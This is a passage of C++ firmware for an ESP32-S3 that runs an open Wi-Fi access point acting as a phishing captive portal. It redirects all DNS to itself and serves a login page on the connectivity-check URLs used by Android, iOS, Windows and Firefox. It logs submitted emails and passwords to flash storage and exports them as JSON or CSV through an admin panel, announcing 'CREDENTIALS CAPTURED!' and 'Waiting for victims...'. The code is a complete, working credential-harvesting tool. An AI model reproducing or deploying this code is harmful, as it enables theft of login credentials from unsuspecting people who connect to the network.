        nextCredentialId = doc["next_id"];
    }
    
    Serial.println("[+] Config loaded");
}

void saveConfig() {
    JsonDocument doc;
    doc["ssid"] = portalSSID;
    doc["admin_user"] = adminUser;
    doc["admin_pass"] = adminPass;
    doc["next_id"] = nextCredentialId;
    doc["version"] = FIRMWARE_VERSION;
    
    File f = SPIFFS.open("/config.json", "w");
    if (f) {
        serializeJson(doc, f);
        f.close();
        Serial.println("[+] Config saved");
    }
}

void loadCredentialCount() {
    File f = SPIFFS.open("/logs.json", "r");
    if (!f) return;
    
    JsonDocument doc;
    DeserializationError error = deserializeJson(doc, f);
    f.close();
    
    if (!error && doc["logs"].is<JsonArray>()) {
        totalCaptures = doc["logs"].as<JsonArray>().size();
    }
}

// ============================================================================
// CREDENTIAL STORAGE
// ============================================================================

void saveCredential(String email, String password, String clientIP) {
    // Read existing logs
    File f = SPIFFS.open("/logs.json", "r");
    JsonDocument doc;
    
    if (f) {
        deserializeJson(doc, f);
        f.close();
    }
    
    JsonArray logs = doc["logs"].to<JsonArray>();
    if (logs.isNull()) {
        logs = doc["logs"].to<JsonArray>();
    }
    
    // Check if we need to remove oldest (FIFO)
    while (logs.size() >= MAX_CREDENTIALS) {
        // Remove first element
        for (size_t i = 0; i < logs.size() - 1; i++) {
            logs[i] = logs[i + 1];
        }
        logs.remove(logs.size() - 1);
    }
    
    // Add new credential
    JsonObject newLog = logs.add<JsonObject>();
    newLog["id"] = nextCredentialId++;
    newLog["timestamp"] = millis() / 1000 + bootTime;
    newLog["email"] = email;
    newLog["password"] = password;
    newLog["ssid"] = portalSSID;
    newLog["client_ip"] = clientIP;
    
    // Save back to file
    f = SPIFFS.open("/logs.json", "w");
    if (f) {
        serializeJson(doc, f);
        f.close();
    }
    
    totalCaptures = logs.size();
    saveConfig(); // Save next_id
    
    Serial.println("[+] Credential saved to SPIFFS");
}

String getLogsJson(int limit = -1) {
    File f = SPIFFS.open("/logs.json", "r");
    if (!f) return "{\"count\":0,\"logs\":[]}";
    
    JsonDocument doc;
    deserializeJson(doc, f);
    f.close();
    
    JsonArray logs = doc["logs"].as<JsonArray>();
    
    JsonDocument response;
    response["count"] = logs.size();
    JsonArray responseLogs = response["logs"].to<JsonArray>();
    
    int start = 0;
    if (limit > 0 && logs.size() > (size_t)limit) {
        start = logs.size() - limit;
    }
    
    for (size_t i = start; i < logs.size(); i++) {
        responseLogs.add(logs[i]);
    }
    
    String result;
    serializeJson(response, result);
    return result;
}

bool deleteCredential(int id) {
    File f = SPIFFS.open("/logs.json", "r");
    if (!f) return false;
    
    JsonDocument doc;
    deserializeJson(doc, f);
    f.close();
    
    JsonArray logs = doc["logs"].as<JsonArray>();
    
    for (size_t i = 0; i < logs.size(); i++) {
        if (logs[i]["id"] == id) {
            logs.remove(i);
            
            f = SPIFFS.open("/logs.json", "w");
            if (f) {
                serializeJson(doc, f);
                f.close();
            }
            totalCaptures = logs.size();
            return true;
        }
    }
    return false;
}

void clearAllLogs() {
    File f = SPIFFS.open("/logs.json", "w");
    if (f) {
        f.println("{\"logs\":[]}");
        f.close();
    }
    totalCaptures = 0;
    Serial.println("[+] All logs cleared");
}

// ============================================================================
// UTILITY FUNCTIONS
// ============================================================================

String escapeJson(String input) {
    String output = "";
    for (unsigned int i = 0; i < input.length(); i++) {
        char c = input.charAt(i);
        switch (c) {
            case '\\': output += "\\\\"; break;
            case '"':  output += "\\\""; break;
            case '\n': output += "\\n"; break;
            case '\r': output += "\\r"; break;
            case '\t': output += "\\t"; break;
            default:   output += c;
        }
    }
    return output;
}

String getTimestamp() {
    char buf[20];
    unsigned long now = millis() / 1000 + bootTime;
    // Simple timestamp format for filename
    sprintf(buf, "%lu", now);
    return String(buf);
}

bool checkAuth(AsyncWebServerRequest *request) {
    if (!request->authenticate(adminUser.c_str(), adminPass.c_str())) {
        return false;
    }
    return true;
}

bool isDefaultCredentials() {
    return (adminUser == DEFAULT_ADMIN_USER && adminPass == DEFAULT_ADMIN_PASS);
}

// Rate limiting
bool checkRateLimit() {
    unsigned long now = millis();
    if (now - lastRequestTime > 1000) {
        lastRequestTime = now;
        requestCount = 1;
        return true;
    }
    requestCount++;
    if (requestCount > 10) {
        return false;
    }
    return true;
}

// ============================================================================
// CAPTIVE PORTAL HANDLER
// ============================================================================

class CaptiveRequestHandler : public AsyncWebHandler {
public:
    CaptiveRequestHandler() {}
    virtual ~CaptiveRequestHandler() {}

    bool canHandle(AsyncWebServerRequest *request) {
        // Don't handle admin or api routes
        String url = request->url();
        if (url.startsWith("/admin") || url.startsWith("/api")) {
            return false;
        }
        return true;
    }

    void handleRequest(AsyncWebServerRequest *request) {
        request->send_P(200, "text/html", portal_html);
    }
};

// ============================================================================
// ROUTE HANDLERS
// ============================================================================

void handleCredentialCapture(AsyncWebServerRequest *request) {
    String email = "";
    String password = "";
    
    if (request->hasParam("email")) {
        email = request->getParam("email")->value();
    } else if (request->hasParam("username")) {
        email = request->getParam("username")->value();
    } else if (request->hasParam("user")) {
        email = request->getParam("user")->value();
    }
    
    if (request->hasParam("password")) {
        password = request->getParam("password")->value();
    } else if (request->hasParam("pass")) {
        password = request->getParam("pass")->value();
    }
    
    if (email.length() > 0 || password.length() > 0) {
        String clientIP = request->client()->remoteIP().toString();
        
        // Log to serial
        Serial.println();
        Serial.println("╔══════════════════════════════════════╗");
        Serial.println("║      CREDENTIALS CAPTURED!           ║");
        Serial.println("╠══════════════════════════════════════╣");
        Serial.print("║ Email:    "); Serial.println(email);
        Serial.print("║ Password: "); Serial.println(password);
        Serial.print("║ IP:       "); Serial.println(clientIP);
        Serial.println("╚══════════════════════════════════════╝");
        
        // Save to SPIFFS
        saveCredential(email, password, clientIP);
        
        // Visual feedback
        blinkAlert(3);
    }
    
    // Return transparent GIF
    const uint8_t gif[] = {
        0x47, 0x49, 0x46, 0x38, 0x39, 0x61, 0x01, 0x00, 0x01, 0x00,
        0x00, 0x00, 0x00, 0x21, 0xf9, 0x04, 0x01, 0x00, 0x00, 0x00,
        0x00, 0x2c, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x01, 0x00,
        0x00, 0x02, 0x01, 0x44, 0x00, 0x3b
    };
    AsyncWebServerResponse *response = request->beginResponse_P(200, "image/gif", gif, sizeof(gif));
    request->send(response);
}

// ============================================================================
// API ROUTES
// ============================================================================

void setupAPIRoutes() {
    // GET /api/v1/status
    server.on("/api/v1/status", HTTP_GET, [](AsyncWebServerRequest *request) {
        if (!checkAuth(request)) {
            request->requestAuthentication();
            return;
        }
        
        JsonDocument doc;
        doc["version"] = FIRMWARE_VERSION;
        doc["uptime"] = millis() / 1000;
        doc["ssid"] = portalSSID;
        doc["ip"] = WiFi.softAPIP().toString();
        doc["credentials_count"] = totalCaptures;
        doc["memory_free"] = ESP.getFreeHeap();
        doc["spiffs_used"] = SPIFFS.usedBytes();
        doc["spiffs_total"] = SPIFFS.totalBytes();
        doc["default_creds"] = isDefaultCredentials();
        
        String response;
        serializeJson(doc, response);
        request->send(200, "application/json", response);
    });
    
    // GET /api/v1/logs
    server.on("/api/v1/logs", HTTP_GET, [](AsyncWebServerRequest *request) {
        if (!checkAuth(request)) {
            request->requestAuthentication();
            return;
        }
        
        int limit = -1;
        if (request->hasParam("limit")) {
            limit = request->getParam("limit")->value().toInt();
        }
        
        request->send(200, "application/json", getLogsJson(limit));
    });
    
    // DELETE /api/v1/logs
    server.on("/api/v1/logs", HTTP_DELETE, [](AsyncWebServerRequest *request) {
        if (!checkAuth(request)) {
            request->requestAuthentication();
            return;
        }
        
        clearAllLogs();
        request->send(200, "application/json", "{\"success\":true,\"message\":\"All logs cleared\"}");
    });
    
    // GET /api/v1/config
    server.on("/api/v1/config", HTTP_GET, [](AsyncWebServerRequest *request) {
        if (!checkAuth(request)) {
            request->requestAuthentication();
            return;
        }
        
        JsonDocument doc;
        doc["ssid"] = portalSSID;
        doc["admin_user"] = adminUser;
        // Don't send password back
        
        String response;
        serializeJson(doc, response);
        request->send(200, "application/json", response);
    });
    
    // GET /api/v1/export/json
    server.on("/api/v1/export/json", HTTP_GET, [](AsyncWebServerRequest *request) {
        if (!checkAuth(request)) {
            request->requestAuthentication();
            return;
        }
        
        String filename = "portal_logs_" + getTimestamp() + ".json";
        AsyncWebServerResponse *response = request->beginResponse(200, "application/json", getLogsJson());
        response->addHeader("Content-Disposition", "attachment; filename=" + filename);
        request->send(response);
    });
    
    // GET /api/v1/export/csv
    server.on("/api/v1/export/csv", HTTP_GET, [](AsyncWebServerRequest *request) {
        if (!checkAuth(request)) {
            request->requestAuthentication();
            return;
        }
        
        // Build CSV
        String csv = "ID,Timestamp,Email,Password,SSID,Client_IP\n";
        
        File f = SPIFFS.open("/logs.json", "r");
        if (f) {
            JsonDocument doc;
            deserializeJson(doc, f);
            f.close();
            
            JsonArray logs = doc["logs"].as<JsonArray>();
            for (JsonObject log : logs) {
                csv += String((int)log["id"]) + ",";
                csv += String((unsigned long)log["timestamp"]) + ",";
                csv += "\"" + log["email"].as<String>() + "\",";
                csv += "\"" + log["password"].as<String>() + "\",";
                csv += "\"" + log["ssid"].as<String>() + "\",";
                csv += log["client_ip"].as<String>() + "\n";
            }
        }
        
        String filename = "portal_logs_" + getTimestamp() + ".csv";
        AsyncWebServerResponse *response = request->beginResponse(200, "text/csv", csv);
        response->addHeader("Content-Disposition", "attachment; filename=" + filename);
        request->send(response);
    });
    
    // POST /api/v1/reboot
    server.on("/api/v1/reboot", HTTP_POST, [](AsyncWebServerRequest *request) {
        if (!checkAuth(request)) {
            request->requestAuthentication();
            return;
        }
        
        request->send(200, "application/json", "{\"success\":true,\"message\":\"Rebooting...\"}");
        delay(1000);
        ESP.restart();
    });
}

// Handle DELETE /api/v1/logs/{id}
void handleDeleteLog(AsyncWebServerRequest *request) {
    if (!checkAuth(request)) {
        request->requestAuthentication();
        return;
    }
    
    String url = request->url();
    int lastSlash = url.lastIndexOf('/');
    String idStr = url.substring(lastSlash + 1);
    int id = idStr.toInt();
    
    if (deleteCredential(id)) {
        request->send(200, "application/json", "{\"success\":true}");
    } else {
        request->send(404, "application/json", "{\"success\":false,\"error\":\"Not found\"}");
    }
}

// Handle POST /api/v1/config
void handleConfigUpdate(AsyncWebServerRequest *request, uint8_t *data, size_t len, size_t index, size_t total) {
    static String body;
    
    if (index == 0) {
        body = "";
    }
    
    for (size_t i = 0; i < len; i++) {
        body += (char)data[i];
    }
    
    if (index + len == total) {
        JsonDocument doc;
        DeserializationError error = deserializeJson(doc, body);
        
        if (error) {
            request->send(400, "application/json", "{\"success\":false,\"error\":\"Invalid JSON\"}");
            return;
        }
        
        bool restartRequired = false;
        
        if (doc["ssid"].is<const char*>()) {
            String newSSID = doc["ssid"].as<String>();
            if (newSSID != portalSSID && newSSID.length() > 0 && newSSID.length() <= 32) {
                portalSSID = newSSID;
                restartRequired = true;
            }
        }
        
        if (doc["admin_user"].is<const char*>()) {
            String newUser = doc["admin_user"].as<String>();
            if (newUser.length() > 0) {
                adminUser = newUser;
            }
        }
        
        if (doc["admin_pass"].is<const char*>()) {
            String newPass = doc["admin_pass"].as<String>();
            if (newPass.length() > 0) {
                adminPass = newPass;
            }
        }
        
        saveConfig();
        
        String response = "{\"success\":true,\"restart_required\":" + String(restartRequired ? "true" : "false") + "}";
        request->send(200, "application/json", response);
    }
}

// ============================================================================
// ADMIN ROUTES
// ============================================================================

void setupAdminRoutes() {
    // Admin login page
    server.on("/admin", HTTP_GET, [](AsyncWebServerRequest *request) {
        if (!checkAuth(request)) {
            request->send_P(200, "text/html", admin_login_html);
            return;
        }
        request->send_P(200, "text/html", admin_dashboard_html);
    });
    
    // Handle login POST
    server.on("/admin/auth", HTTP_POST, [](AsyncWebServerRequest *request) {
        String user = "";
        String pass = "";
        
        if (request->hasParam("username", true)) {
            user = request->getParam("username", true)->value();
        }
        if (request->hasParam("password", true)) {
            pass = request->getParam("password", true)->value();
        }
        
        if (user == adminUser && pass == adminPass) {
            // Set auth cookie and redirect
            AsyncWebServerResponse *response = request->beginResponse(302);
            response->addHeader("Location", "/admin");
            request->send(response);
        } else {
            AsyncWebServerResponse *response = request->beginResponse(302);
            response->addHeader("Location", "/admin?error=1");
            request->send(response);
        }
    });
    
    // Admin pages (all require auth)
    server.on("/admin/logs", HTTP_GET, [](AsyncWebServerRequest *request) {
        if (!checkAuth(request)) {
            request->requestAuthentication();
            return;
        }
        request->send_P(200, "text/html", admin_logs_html);
    });
    
    server.on("/admin/config", HTTP_GET, [](AsyncWebServerRequest *request) {
        if (!checkAuth(request)) {
            request->requestAuthentication();
            return;
        }
        request->send_P(200, "text/html", admin_config_html);
    });
    
    server.on("/admin/export", HTTP_GET, [](AsyncWebServerRequest *request) {
        if (!checkAuth(request)) {
            request->requestAuthentication();
            return;
        }
        request->send_P(200, "text/html", admin_export_html);
    });
    
    server.on("/admin/logout", HTTP_GET, [](AsyncWebServerRequest *request) {
        // Clear auth by sending 401
        AsyncWebServerResponse *response = request->beginResponse(302);
        response->addHeader("Location", "/admin");
        // Force browser to forget credentials
        response->addHeader("WWW-Authenticate", "Basic realm=\"Admin\"");
        request->send(response);
    });
}

// ============================================================================
// CAPTIVE PORTAL DETECTION ROUTES
// ============================================================================

void setupCaptivePortalRoutes() {
    // Main page
    server.on("/", HTTP_GET, [](AsyncWebServerRequest *request) {
        request->send_P(200, "text/html", portal_html);
    });
    
    // Credential capture
    server.on("/get", HTTP_GET, handleCredentialCapture);
    
    // Android
    server.on("/generate_204", HTTP_GET, [](AsyncWebServerRequest *request) {
        request->send_P(200, "text/html", portal_html);
    });
    server.on("/gen_204", HTTP_GET, [](AsyncWebServerRequest *request) {
        request->send_P(200, "text/html", portal_html);
    });
    
    // iOS
    server.on("/hotspot-detect.html", HTTP_GET, [](AsyncWebServerRequest *request) {
        request->send_P(200, "text/html", portal_html);
    });
    server.on("/library/test/success.html", HTTP_GET, [](AsyncWebServerRequest *request) {
        request->send_P(200, "text/html", portal_html);
    });
    server.on("/success.txt", HTTP_GET, [](AsyncWebServerRequest *request) {
        request->send_P(200, "text/html", portal_html);
    });
    
    // Windows
    server.on("/connecttest.txt", HTTP_GET, [](AsyncWebServerRequest *request) {
        request->send_P(200, "text/html", portal_html);
    });
    server.on("/ncsi.txt", HTTP_GET, [](AsyncWebServerRequest *request) {
        request->send_P(200, "text/html", portal_html);
    });
    
    // Firefox
    server.on("/canonical.html", HTTP_GET, [](AsyncWebServerRequest *request) {
        request->send_P(200, "text/html", portal_html);
    });
}

// ============================================================================
// SETUP
// ============================================================================

void setup() {
    // Initialize LED
    setupLED();
    ledStarting();
    
    // Initialize Serial
    Serial.begin(115200);
    delay(1000);
    
    // Welcome message
    Serial.println();
    Serial.println("╔══════════════════════════════════════════════╗");
    Serial.println("║   ESP32-S3 Captive Portal v" FIRMWARE_VERSION "            ║");
    Serial.println("║   With Admin Panel & Persistent Storage      ║");
    Serial.println("╚══════════════════════════════════════════════╝");
    Serial.println();
    
    // Initialize SPIFFS
    if (!initSPIFFS()) {
        Serial.println("[!] SPIFFS failed - credentials won't persist!");
    }
    
    // Get approximate boot time (will be 0 at actual boot, but helps with relative timestamps)
    bootTime = 0; // In real implementation, you might use NTP or RTC
    
    // Configure WiFi AP
    Serial.println("[*] Configuring WiFi Access Point...");
    
    WiFi.disconnect();
    delay(100);
    WiFi.mode(WIFI_OFF);
    delay(100);
    WiFi.mode(WIFI_AP);
    delay(100);
    
    // Set custom IP
    WiFi.softAPConfig(apIP, apIP, netMsk);
    delay(100);
    
    WiFi.softAP(portalSSID.c_str(), "");
    delay(100);
    
    Serial.print("[+] SSID: ");
    Serial.println(portalSSID);
    Serial.print("[+] IP:   ");
    Serial.println(WiFi.softAPIP());
    Serial.println();
    
    // Setup routes
    Serial.println("[*] Setting up web server...");
    
    setupCaptivePortalRoutes();
    setupAdminRoutes();
    setupAPIRoutes();
    
    // Handle DELETE /api/v1/logs/{id}
    server.on("^\\/api\\/v1\\/logs\\/(\\d+)$", HTTP_DELETE, handleDeleteLog);
    
    // Handle POST /api/v1/config with body
    server.on("/api/v1/config", HTTP_POST, 
        [](AsyncWebServerRequest *request) {},
        NULL,
        handleConfigUpdate
    );
    
    // DNS server - redirect all domains to our IP
    dnsServer.setErrorReplyCode(DNSReplyCode::NoError);
    dnsServer.start(53, "*", apIP);
    
    // Catch-all handler for captive portal
    server.addHandler(new CaptiveRequestHandler()).setFilter(ON_AP_FILTER);
    
    // Start server
    server.begin();
    
    Serial.println("[+] Web server started");
    Serial.println("[+] DNS server started");
    Serial.println("[+] Admin panel at: http://" + apIP.toString() + "/admin");
    Serial.println("[+] API endpoint:   http://" + apIP.toString() + "/api/v1");
    Serial.println();
    
    if (isDefaultCredentials()) {
        Serial.println("╔══════════════════════════════════════════════╗");
        Serial.println("║  ⚠️  WARNING: Using default admin credentials! ║");
        Serial.println("║     Please change them in /admin/config      ║");
        Serial.println("╚══════════════════════════════════════════════╝");
        Serial.println();
    }
    
    Serial.println("══════════════════════════════════════════════");
    Serial.println("   Portal is READY - Waiting for victims...");
    Serial.println("══════════════════════════════════════════════");
    Serial.println();
    
    // Ready!
    ledReady();
}

// ============================================================================
// MAIN LOOP
// ============================================================================

void loop() {
    dnsServer.processNextRequest();
}
